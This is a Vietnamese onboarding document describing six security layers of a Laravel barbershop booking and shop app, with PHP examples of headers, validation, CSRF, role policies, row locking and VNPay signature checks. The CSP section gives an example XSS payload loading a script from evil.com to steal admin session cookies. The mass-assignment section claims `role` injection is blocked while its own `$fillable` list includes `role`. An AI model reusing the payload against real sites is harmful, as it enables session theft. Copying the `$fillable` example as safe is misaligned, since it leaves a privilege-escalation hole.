# 🛡 Kiến trúc Bảo mật (Security Architecture) — Classic Cut Barbershop

> Hệ thống **Classic Cut Barbershop** được thiết kế nguyên khối (monolithic) dựa trên framework Laravel.
> Mặc dù là ứng dụng vừa và nhỏ phục vụ Đặt lịch hẹn và E-commerce, yếu tố bảo mật được đặt lên hàng đầu.
>
> Tài liệu này mô tả 6 **Tầng Phòng thủ (Layers of Defense)** đang được áp dụng,
> mỗi tầng đều giải thích theo khung: **WHAT** (Là gì?) → **WHY** (Tại sao?) → **HOW** (Code thực tế).

---

## Tầng 1: Cấu hình Server & Header Trình duyệt

Trình duyệt là tuyến đầu. Middleware toàn cục `SecurityHeaders.php` gắn các HTTP headers bảo mật vào **mọi response**.

**🎯 WHAT:** Đóng chặt các cổng giao tiếp trên giao diện người dùng, ngăn mã độc chạy lén trên máy của khách.

**❓ WHY:**
- **Content Security Policy (CSP):** Nếu hệ thống bị XSS, hacker chèn `<script src="http://evil.com/leak.js">` vào mục Đánh giá. Khi Admin vào xem, script đánh cắp Session Cookie. CSP chỉ cho phép chạy Javascript từ các Domain đã duyệt (Whitelist).
- **X-Frame-Options (DENY):** Kẻ xấu nhúng trang thanh toán vào `<iframe>` trên web giả mạo, làm trong suốt nút bấm để lừa người dùng click "Thanh toán". Lệnh `DENY` khiến trang từ chối hiển thị trong Iframe.

**🛠 HOW:**
```php
// File: app/Http/Middleware/SecurityHeaders.php

public function handle(Request $request, Closure $next)
{
    $response = $next($request);

    $response->headers->set('X-Content-Type-Options', 'nosniff');         // Chống MIME sniffing
    $response->headers->set('X-Frame-Options', 'DENY');                   // Chống Clickjacking
    $response->headers->set('X-XSS-Protection', '1; mode=block');        // Chống XSS (trình duyệt cũ)
    $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
    $response->headers->set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    // + Content-Security-Policy (CSP) — dynamic per environment

    return $response;
}
```

**Đăng ký:** `bootstrap/app.php` → `$middleware->append(SecurityHeaders::class)` — áp dụng cho **tất cả** routes.

---

## Tầng 2: Input Validation & Mass Assignment

Cửa khẩu tiếp nhận dữ liệu từ Request (POST, PUT, PATCH). Hệ thống sử dụng duy nhất lớp **FormRequests**.

**🎯 WHAT:** Lọc sạch sẽ 100% dữ liệu bẩn / không đúng định dạng trước khi cho nó đi vào tầng sâu hơn.

**❓ WHY:**
- **Sạch sẽ Controller:** Viết `$request->validate()` trong Controller biến ruột Controller thành bãi rác chuyên báo lỗi. FormRequest giống thuê bảo vệ chặn cổng thay vì để Giám đốc (Controller) ra xét vé.
- **Chống Mass Assignment:** Gọi `User::create($request->all())` → hacker F12 nhét `"role": "admin"` → tạo tài khoản admin! Model `$fillable` cấm gán biến trán lan, chỉ cho phép các trường đã khai báo.

**🛠 HOW:**
```php
// File: app/Http/Requests/Client/StoreBookingRequest.php
class StoreBookingRequest extends FormRequest
{
    public function rules(): array
    {
        return [
            'service_ids'   => 'required|array|min:1',
            'service_ids.*' => 'exists:services,id',       // Mỗi service phải tồn tại
            'barber_id'     => 'required|exists:barbers,id',
            'time_slot_id'  => 'required|exists:time_slots,id',
            'note'          => 'nullable|string|max:500',
        ];
    }
    // Fail? → Laravel tự redirect back + $errors
    // Controller KHÔNG BAO GIỜ nhận data sai
}

// File: app/Models/User.php — Mass Assignment Protection
protected $fillable = ['name', 'email', 'password', 'role', 'phone', 'avatar', 'is_active'];
// → $request->all() chứa "is_superadmin": true → bị bỏ qua hoàn toàn
```

---

## Tầng 3: CSRF Protection & Auth Modal

**🎯 WHAT:** Ngăn chặn lừa đảo danh tính (CSRF) và giữ luồng mua sắm liền mạch bằng Auth Popup.

**❓ WHY:**
- **CSRF (Cross-Site Request Forgery):** Khách đang Login ở tab 1. Tab 2 bị lừa truy cập trang web đen. Trang kia POST ngầm `https://barbershop.com/admin/delete-all-users`. Trình duyệt tự đính kèm Cookie → thao tác thành công! Middleware `@csrf` sinh token ngẫu nhiên chết dính với Session. Form không có token → HTTP 419 Page Expired.
- **Auth Modal:** Middleware `auth` truyền thống hất văng về `/login` khi bấm "Áp mã giảm giá" → luồng mua sắm đứt gãy. Alpine.js `@click.prevent` hiện Popup Auth ngay tại chỗ → đăng nhập xong → action gốc tự tiếp tục.

**🛠 HOW:**
```php
// Blade form — tất cả form đều phải có @csrf
<form method="POST" action="/booking">
    @csrf   {{-- <input type="hidden" name="_token" value="random_token_here"> --}}
    ...
</form>

// Ngoại lệ: VNPay IPN callback — server-to-server, không có browser
// File: routes/web.php
Route::post('/payment/vnpay/ipn', [PaymentController::class, 'vnpayIPN'])
    ->withoutMiddleware([\Illuminate\Foundation\Http\Middleware\VerifyCsrfToken::class]);
```

---

## Tầng 4: Phân quyền Authorization (Role & Policy)

3 Role: `admin`, `barber`, `customer`. Kết hợp Route Middleware (phân quyền cụm vùng) + Policy (phân quyền từng dòng).

**🎯 WHAT:** Đảm bảo ranh giới quyền lực: Ai được làm gì trên hệ thống (Role) và Ai được đụng vào Record cụ thể nào (Policy).

**❓ WHY:**
- **RoleMiddleware:** Thợ (Barber) không được gõ URL `/admin/revenue` xem doanh thu. Middleware chặn từ vòng gửi xe.
- **IDOR (Insecure Direct Object Reference):** Khách A gọi `cancel(15)`. Nếu chỉ xoá theo tham số, A xoá luôn booking của Khách B. Policy check: *"Booking #15 có thuộc về A không?"* → Không → 403 Forbidden.

**🛠 HOW:**
```php
// File: app/Http/Middleware/RoleMiddleware.php
public function handle(Request $request, Closure $next, string ...$roles): Response
{
    $allowedRoles = array_map(fn ($role) => UserRole::from($role), $roles);
    if (!auth()->check() || !in_array(auth()->user()->role, $allowedRoles)) {
        abort(403);
    }
    return $next($request);
}

// File: routes/admin.php — Tất cả route yêu cầu role:admin
Route::middleware(['auth', 'role:admin'])->group(function () { ... });

// File: app/Policies/BookingPolicy.php — Row-Level check
public function cancel(User $user, Booking $booking): bool
{
    if ($user->id !== $booking->customer_id) return false;        // Chỉ chủ sở hữu
    if (!in_array($booking->status, [BookingStatus::Pending, BookingStatus::Confirmed])) return false;
    $appointmentTime = Carbon::parse($booking->booking_date . ' ' . $booking->start_time);
    return now()->diffInMinutes($appointmentTime, false) >= 120;  // Trước 2 tiếng
}

// Controller — 1 dòng:
$this->authorize('cancel', $booking);  // false → abort(403)
```

**Minh hoạ:**
```
                       Middleware                          Policy
                    ┌─────────────┐                  ┌─────────────┐
Tuấn (barber) ────▶│ role:barber  │──── PASS ✅ ───▶│ confirm()   │──── booking CỦA Tuấn? ✅
Minh (barber) ────▶│ role:barber  │──── PASS ✅ ───▶│ confirm()   │──── booking CỦA Minh? ❌
Khách (customer) ──▶│ role:barber  │──── DENY ❌     │             │    (không tới đây)
                    └─────────────┘                  └─────────────┘
```

---

## Tầng 5: Race Conditions (Pessimistic Locking)

**🎯 WHAT:** `DB::transaction()` + `lockForUpdate()` khoá hàng dữ liệu ở cấp MySQL khi có nhiều request tranh chấp.

**❓ WHY:**
- **Double-booking:** Mã Voucher `KHAITRUONG` có `limit: 100`, đang `used: 99`. Hai người bấm "Mua" lúc 12:00:00.001. Hệ thống thấy `used (99) < limit (100)` cho cả hai → Voucher xài 101 lần!
- **Oversell:** Pomade còn 1 hộp. 2 người mua cùng lúc → `stock` bị âm.

**🛠 HOW:**
```php
// File: app/Services/BookingService.php — Chống double-booking
return DB::transaction(function () use ($data) {
    $slot = TimeSlot::lockForUpdate()->findOrFail($data->time_slot_id);
    //               ^^^^^^^^^^^^^^ SQL: SELECT ... FOR UPDATE
    //               → Hàng bị KHOÁ cho đến khi transaction COMMIT

    if ($slot->status !== TimeSlotStatus::Available) {
        throw new SlotNotAvailableException('Slot đã được đặt.');
    }

    // ... tạo booking ...
    $slot->update(['status' => TimeSlotStatus::Booked]);
});

// File: app/Services/ProductService.php — Chống oversell
public function decreaseStock(int $productId, int $quantity): void
{
    $product = Product::lockForUpdate()->findOrFail($productId);
    if ($product->stock_quantity < $quantity) {
        throw new \Exception("Sản phẩm hết hàng.");
    }
    $product->decrement('stock_quantity', $quantity);
}
```

**Timeline: 2 người đặt cùng slot:**
```
A: lockForUpdate() → ✅ Lấy lock → Tạo booking → COMMIT → Giải lock
B: lockForUpdate() → ⏳ Chờ A commit → Đọc lại → status='booked' → ❌ FAIL → ROLLBACK
```

---

## Tầng 6: Webhook IPN & Giả mạo Chữ ký (Signature)

Cổng Server-to-Server (IPN) nhận callback từ VNPay/MoMo — nơi nguy hiểm cất giấu tính mạng doanh thu.

**🎯 WHAT:** Ngăn hacker gửi tín hiệu mạo danh ngân hàng để mở khoá đơn hàng không trả phí. Ngăn callback trùng lặp bơm tiền ảo.

**❓ WHY:**
- **Idempotency:** VNPay gửi "Đã thanh toán" 5 lần (do rớt mạng). Hàm xử lý chỉ chạy 1 lần — check `$payment->status`, đã khác `Pending` thì return 200 OK ngay. Không xuất thừa kho, không nạp lố tiền.
- **Signature Verify:** HMAC SHA512 tạo chữ ký một chiều. Hacker đổi `amount=100_000` thành `amount=10_000` → chữ ký trật nhịp → từ chối thanh toán.
- **IPN Whitelisting:** Hacker gõ URL webhook lên Postman gửi POST liên tục mạo danh VNPay. Hệ thống check IP gốc — không nằm trong danh sách IP chính thức VNPay → HTTP 403.

**🛠 HOW:**
```php
// File: app/Services/PaymentService.php (dùng PaymentGatewayTrait)

public function verifyVNPayCallback(array $inputData): array
{
    // 1. VERIFY CHỮ KÝ — chống giả mạo
    $vnpSecureHash = $inputData['vnp_SecureHash'];
    unset($inputData['vnp_SecureHash'], $inputData['vnp_SecureHashType']);
    ksort($inputData);

    $hashData = http_build_query($inputData);
    $calculatedHash = hash_hmac('sha512', $hashData, config('services.vnpay.hash_secret'));

    if (!hash_equals($calculatedHash, $vnpSecureHash)) {
        return ['success' => false, 'message' => 'Invalid signature'];
    }

    // 2. IDEMPOTENCY — đã xử lý rồi? Return kết quả cũ
    $payment = Payment::findOrFail($this->extractPaymentId($inputData['vnp_TxnRef']));
    if ($payment->status !== PaymentStatus::Pending) {
        return ['success' => $payment->status === PaymentStatus::Paid, 'booking' => $payment->booking];
    }

    // 3. Lần đầu xử lý → cập nhật status
    if ($inputData['vnp_ResponseCode'] === '00') {
        $payment->update([
            'status'         => PaymentStatus::Paid,
            'transaction_id' => $inputData['vnp_TransactionNo'],
            'paid_at'        => now(),
        ]);
        return ['success' => true, 'booking' => $payment->booking];
    }

    $payment->update(['status' => PaymentStatus::Failed]);
    return ['success' => false, 'booking' => $payment->booking];
}
```

---

## Tổng hợp 6 Tầng Phòng thủ

```
┌─────────────────────────────────────────────────────────────────┐
│  Tầng 1: Security Headers    │  CSP, X-Frame-Options, XSS      │
│  (Trình duyệt)               │  → Chặn tấn công client-side    │
├───────────────────────────────┼─────────────────────────────────┤
│  Tầng 2: FormRequest         │  Validate + $fillable            │
│  (Input)                      │  → Lọc dữ liệu bẩn/thừa        │
├───────────────────────────────┼─────────────────────────────────┤
│  Tầng 3: CSRF + Auth Modal   │  Token + Alpine.js popup        │
│  (Identity)                   │  → Chống giả mạo danh tính     │
├───────────────────────────────┼─────────────────────────────────┤
│  Tầng 4: Role + Policy       │  Middleware + Row-Level         │
│  (Authorization)              │  → Ai được làm gì với record nào│
├───────────────────────────────┼─────────────────────────────────┤
│  Tầng 5: Pessimistic Locking │  lockForUpdate() + transaction  │
│  (Data Integrity)             │  → Chống double-booking/oversell│
├───────────────────────────────┼─────────────────────────────────┤
│  Tầng 6: Signature + IPN     │  HMAC + Idempotency            │
│  (Payment)                    │  → Chống giả mạo thanh toán    │
└─────────────────────────────────────────────────────────────────┘
```

---

*Tài liệu này được biên soạn cho mục đích đào tạo tư duy hệ thống và huấn luyện Onboarding nhân sự mới.*
*Đọc kết hợp với [handbook.md](handbook.md) để bám sát cách dự án mổ xẻ Source Code thực tiễn.*
